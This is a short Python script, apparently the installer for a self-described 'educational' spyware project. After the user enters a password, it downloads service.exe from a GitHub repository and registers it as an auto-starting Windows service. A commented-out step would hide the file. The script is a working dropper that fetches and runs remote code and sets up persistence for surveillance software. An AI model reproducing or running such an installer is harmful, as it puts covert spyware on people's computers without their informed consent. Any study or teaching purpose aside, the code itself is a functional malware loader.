import pymsgbox

ask = '''
In order to continue and make sure you don't actually run the program accidentally, enter the password which appears in the code:
'''
PASSWORD = 'vma29ISCJLKVuwaDBKOdkf43BE9Towr' #the password to run the spyware

def main():
    return_val = pymsgbox.password(ask, 'eduspyware')
    if not return_val == PASSWORD:
        if return_val is not None:
            pymsgbox.alert('Wrong password. Exiting...', 'eduspyware')
        return

    pymsgbox.alert('Correct password!', 'eduspyware')

    import os
    import requests
    url = 'https://github.com/eviatarbutin/EducationalSpyware/blob/main/service.exe?raw=true'
    r = requests.get(url, allow_redirects=True)
    open('service.exe', 'wb').write(r.content)
    '''
    import subprocess
    subprocess.check_call(["attrib","+H","service.exe"])
    '''
    srv_name = 'My Service'
    os.system(fr'sc create "{srv_name}" start=auto binPath="C:\Users\user\Desktop\Python\EducationalSpyware\dist\service.exe"')
    os.system(f'sc start "{srv_name}"')



if __name__ == '__main__':
    main()







